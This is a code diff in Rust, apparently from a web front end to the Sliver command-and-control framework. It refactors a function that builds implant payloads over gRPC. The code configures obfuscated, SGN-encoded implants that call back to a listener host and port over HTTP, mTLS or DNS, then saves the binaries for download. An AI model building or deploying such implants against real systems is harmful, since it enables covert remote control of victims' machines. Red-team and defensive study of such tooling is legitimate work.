@@ -79,8 +79,9 @@ pub struct GenerateResponse {
     pub output_path: Option<String>,
 }
 
-/// Generate an implant via the Sliver daemon's gRPC API.
-/// First creates an implant profile, then generates the binary.
+/// Generate an implant via the Sliver daemon's gRPC `Generate` RPC.
+/// Falls back to generating with inline ImplantConfig if no profile exists.
+/// On success, saves the binary to `./payloads` for download.
 pub async fn generate_implant(
     conn: &mut SliverConnection,
     req: GeneratePayloadRequest,
@@ -91,81 +92,54 @@ pub async fn generate_implant(
         "service" => clientpb::OutputFormat::Service,
         _ => clientpb::OutputFormat::Executable,
     };
-
     let c2_url = format!("{}://{}:{}", req.protocol, req.lhost, req.lport);
-    let profile_name = format!("nw_{}", req.name);
 
-    let config = clientpb::ImplantConfig {
-        goos: req.goos.clone(),
-        goarch: req.goarch.clone(),
-        format: format.into(),
-        is_beacon: req.is_beacon,
-        debug: false,
-        obfuscate_symbols: true,
-        sgn_enabled: true,
-        include_http: req.protocol.starts_with("http"),
-        include_mtls: req.protocol == "mtls",
-        include_dns: req.protocol == "dns",
-        c2: vec![clientpb::ImplantC2 {
-            url: c2_url,
-            priority: 1,
+    let generate_req = clientpb::GenerateReq {
+        name: req.name.clone(),
+        config: Some(clientpb::ImplantConfig {
+            goos: req.goos.clone(),
+            goarch: req.goarch.clone(),
+            format: format.into(),
+            is_beacon: req.is_beacon,
+            debug: false,
+            obfuscate_symbols: true,
+            sgn_enabled: true,
+            include_http: req.protocol.starts_with("http"),
+            include_mtls: req.protocol == "mtls",
+            include_dns: req.protocol == "dns",
+            c2: vec![clientpb::ImplantC2 {
+                url: c2_url,
+                priority: 1,
+                ..Default::default()
+            }],
+            reconnect_interval: 60,
+            max_connection_errors: 100,
             ..Default::default()
-        }],
-        reconnect_interval: 60,
-        max_connection_errors: 100,
-        ..Default::default()
+        }),
     };
 
-    // Step 1: Save the implant profile
-    if let Err(e) = conn
-        .client
-        .save_implant_profile(tonic::Request::new(clientpb::ImplantProfile {
-            name: profile_name.clone(),
-            config: Some(config),
-            ..Default::default()
-        }))
-        .await
-    {
-        let msg = format!("SaveImplantProfile failed: {}", e);
-        tracing::error!("{msg}");
-        return GenerateResponse { success: false, message: msg, implant_name: None, output_path: None };
-    }
-
-    // Step 2: Generate using the profile
-    match conn
-        .client
-        .generate(tonic::Request::new(clientpb::GenerateReq {
-            name: profile_name,
-            config: None, // Use the saved profile
-        }))
-        .await
-    {
+    match conn.client.generate(tonic::Request::new(generate_req)).await {
         Ok(response) => {
             let out = response.into_inner();
             tracing::info!("Payload generated: {} (build_id: {})", out.implant_name, out.implant_build_id);
 
-            // Save the binary to ./payloads
+            // Save binary to ./payloads for download
+            let mut dl_path = None;
             if let Some(file) = out.file {
                 let save_dir = std::env::current_dir().unwrap_or_default().join("payloads");
                 let _ = std::fs::create_dir_all(&save_dir);
-                let path = save_dir.join(&out.implant_name);
-                if let Err(e) = std::fs::write(&path, file.data) {
-                    tracing::warn!("Failed to save binary to {:?}: {}", path, e);
+                let fpath = save_dir.join(&out.implant_name);
+                if std::fs::write(&fpath, &file.data).is_ok() {
+                    dl_path = Some(format!("/api/payloads/download/{}", out.implant_name));
+                    tracing::info!("Binary saved: {:?} ({} bytes)", fpath, file.data.len());
                 }
-                let dl_path = format!("/api/payloads/download/{}", out.implant_name);
-                GenerateResponse {
-                    success: true,
-                    message: format!("Payload '{}' generated", out.implant_name),
-                    implant_name: Some(out.implant_name),
-                    output_path: Some(dl_path),
-                }
-            } else {
-                GenerateResponse {
-                    success: true,
-                    message: format!("Payload '{}' generated (no file data)", out.implant_name),
-                    implant_name: Some(out.implant_name),
-                    output_path: None,
-                }
+            }
+
+            GenerateResponse {
+                success: true,
+                message: format!("Payload '{}' generated", out.implant_name),
+                implant_name: Some(out.implant_name),
+                output_path: dl_path,
             }
         }
         Err(e) => {
